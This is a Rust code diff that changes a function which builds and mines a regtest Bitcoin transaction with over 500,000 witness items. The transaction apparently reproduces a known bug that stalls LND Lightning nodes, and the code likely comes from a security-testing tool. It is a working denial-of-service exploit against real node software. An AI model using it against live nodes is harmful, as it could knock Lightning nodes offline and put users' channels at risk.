@@ -23,6 +23,7 @@ use lightning_block_sync::{
 use std::collections::HashMap;
 use std::str::FromStr;
 use std::sync::Arc;
+use bitcoin::blockdata::opcodes::all::OP_PUSHBYTES_0;
 
 pub struct FundedTx {
     pub changepos: i64,
@@ -320,7 +321,7 @@ pub fn broadcast_lnd_15_exploit(
 
 pub fn broadcast_lnd_max_witness_items_exploit(
     bitcoind_client: Arc<Client>,
-) -> Result<Txid, Box<dyn std::error::Error>> {
+) -> Result<BlockHash, Box<dyn std::error::Error>> {
     // TODO generate tweaked public key
     let secp = Secp256k1::new();
     let internal_key = UntweakedPublicKey::from_str(
@@ -328,14 +329,10 @@ pub fn broadcast_lnd_max_witness_items_exploit(
     )
     .unwrap();
 
-    // OP_LEFT is a disabled op code that is now an OP_SUCCESSSx under taproot
-    let init = Builder::new().push_opcode(opcodes::all::OP_LEFT);
+    let dummy_script = Script::new_p2pkh(&bitcoin::PubkeyHash::all_zeros());
+    let dummy_addr = Address::from_script(&dummy_script, Network::Regtest).unwrap();
 
-    let script_builder = (0..500_000)
-        .into_iter()
-        .fold(init, |b, _| b.push_slice(&vec![]));
-
-    let script = script_builder.into_script();
+    let script = Builder::new().push_opcode(opcodes::all::OP_RESERVED).into_script();
     let tr_script = script.to_v1_p2tr(&secp, internal_key);
     let addr = Address::from_script(&tr_script, Network::Regtest).unwrap();
 
@@ -343,6 +340,8 @@ pub fn broadcast_lnd_max_witness_items_exploit(
 
     let txid =
         bitcoind_client.send_to_address(&addr, amount, None, None, None, None, None, None)?;
+
+    let tx1 = bitcoind_client.get_raw_transaction(&txid, None)?;
 
     // find which output was used to fund the address
     let get_tx_out_result = bitcoind_client.get_tx_out(&txid, 0, Some(true))?;
@@ -364,8 +363,11 @@ pub fn broadcast_lnd_max_witness_items_exploit(
     let control_block = spend_info
         .control_block(&(script.clone(), LeafVersion::TapScript))
         .expect("Could not create control block");
-    // witness is spending script followed by control block
-    let witness = vec![script.serialize(), control_block.serialize()];
+
+    let mut witness: Vec<Vec<u8>> = vec![];
+    (0..500_001).for_each(|_| witness.push(vec![OP_PUSHBYTES_0.to_u8()]));
+    witness.push(script.serialize());
+    witness.push(control_block.serialize());
 
     let txin = TxIn {
         previous_output: OutPoint { txid, vout },
@@ -380,12 +382,12 @@ pub fn broadcast_lnd_max_witness_items_exploit(
         input: vec![txin],
         output: vec![TxOut {
             value: amount.to_sat() - 150_000,
-            script_pubkey: Script::new_p2pkh(&bitcoin::PubkeyHash::all_zeros()),
+            script_pubkey: dummy_script,
         }],
     };
 
-    match bitcoind_client.send_raw_transaction(&created_tx) {
-        Ok(txid) => Ok(txid),
+    match bitcoind_client.generate_block(&dummy_addr, &[&tx1, &created_tx]) {
+        Ok(result) => Ok(result.hash),
         Err(e) => Err(e.into()),
     }
 }
